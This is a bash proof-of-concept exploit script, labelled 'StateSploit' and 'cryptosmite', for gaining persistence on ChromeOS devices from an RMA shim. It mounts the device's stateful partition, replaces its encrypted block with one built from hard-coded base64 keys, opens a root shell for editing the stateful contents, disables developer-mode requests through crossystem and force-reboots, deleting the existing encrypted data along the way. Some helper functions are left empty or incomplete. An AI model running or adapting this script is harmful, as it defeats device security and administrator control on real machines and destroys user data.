#!/bin/bash
# [THIS IS A SERIOUS EXPLOIT. IT ALLOWS FOR CHROMEOS PERSISTENCE]
# Run this on a rma shim.
packedkey () {
    cat <<EOF | base64 -d
24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l
EOF
    return;
}
#Definitely not taken from the chromium source code
get_largest_nvme_namespace() { 
  local largest size tmp_size dev
  size=0
  dev=$(basename "$1")

  for nvme in /sys/block/"${dev%n*}"*; do
    tmp_size=$(cat "${nvme}"/size)
    if [ "${tmp_size}" -gt "${size}" ]; then
      largest="${nvme##*/}"
      size="${tmp_size}"
    fi
  done
  echo "${largest}"
}
packedecryptfs() {
    cat <<EOF | base64 -d
p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
EOF
return;
}
cryptsetupx() {
    mount --bind /dev /mnt/shim_stateful/cryptsetup_root/dev
    mount --bind /proc /mnt/shim_stateful/cryptsetup_root/proc
    mount --bind /sys /mnt/shim_stateful/cryptsetup_root/sys
    mount --bind /mnt/sp1 /mnt/shim_stateful/cryptsetup_root/mnt
    packedecryptfs > /mnt/shim_stateful/cryptsetup_root/enc.key
    echo "You may now see the encryption key that is used to create the stateful partition. Check cryptsetup_root"
    cat <<EOF > /mnt/shim_stateful/cryptsetup_root/xyz.sh
echo "Using cryptsetup..."
cryptsetup open --key-file /enc.key --type plain /mnt/encrypted.block enc
EOF
    sudo chroot /mnt/shim_stateful/cryptsetup_root sh /xyz.sh
    mkfs.ext4 /dev/mapper/enc
    
    mkdir -p /mnt/stateful
    mount -o loop,rw /dev/mapper/enc /mnt/stateful
    
}
cryptsetupendx() {
    cat <<EOF > /mnt/shim_stateful/cryptsetup_root/xyz.sh
echo "Cleaning up cryptsetup mount"
cryptsetup close enc
EOF
    sudo chroot /mnt/shim_stateful/cryptsetup_root sh /xyz.sh

}
getstage2() {
    cat <<EOF >> /mnt/encrypted_block/stage2.sh

EOF
}
endstage2() {
    cat <<EOF >> /mnt/encrypted_block/endstage2.sh
echo "Cleaning up Stage II"
echo "Unmounting enc-block"
umount 
cryptsetup close /dev/mapper/enc
EOF
}
createfilewithsize() {
    dd if=/dev/urandom of=$1 count=1 bs=$2
}
#------PoC of StateSploit by writable----
{
mkdir /mnt/shim_stateful
mount -o loop,rw /dev/sda1 /mnt/shim_stateful
mkdir -p /mnt/sp1
mount -o loop,rw /dev/mmcblk0p1 /mnt/sp1
cd /mnt/sp1

if [ -f /mnt/sp1/encrypted.key ]
then
    rm -f /mnt/sp1/encrypted.key
fi
echo "Using the key packed with cryptosmite. It will be a key you generate later."
packedkey > encrypted.needs-finalization
echo Finding cryptsetup.tar.xz at /usr/local/cryptsetup.tar.xz
mount -o remount,nr_inodes=0 /
rm /mnt/sp1/encrypted.block
dd if=/dev/zero of=/mnt/sp1/encrypted.block bs=1M count=1024 status=progress # Hopefully 1GB is good enough
cryptsetupx

echo "Edit your stateful here in /mnt/stateful and exit to save changes"
su -p -c "bash -i"
umount /mnt/stateful
cryptsetupendx
crossystem disable_dev_request=1
crossystem disable_dev_request=1 # we have to do it twice because of mosys :)
echo "SMITED SUCCESSFULLY!"
echo -e "Rebooting in 3 seconds"
sleep 3
reboot -f
} || {
    echo "Cleaing up, exploit failed"
    umount /mnt/sp1
    exit 0
}
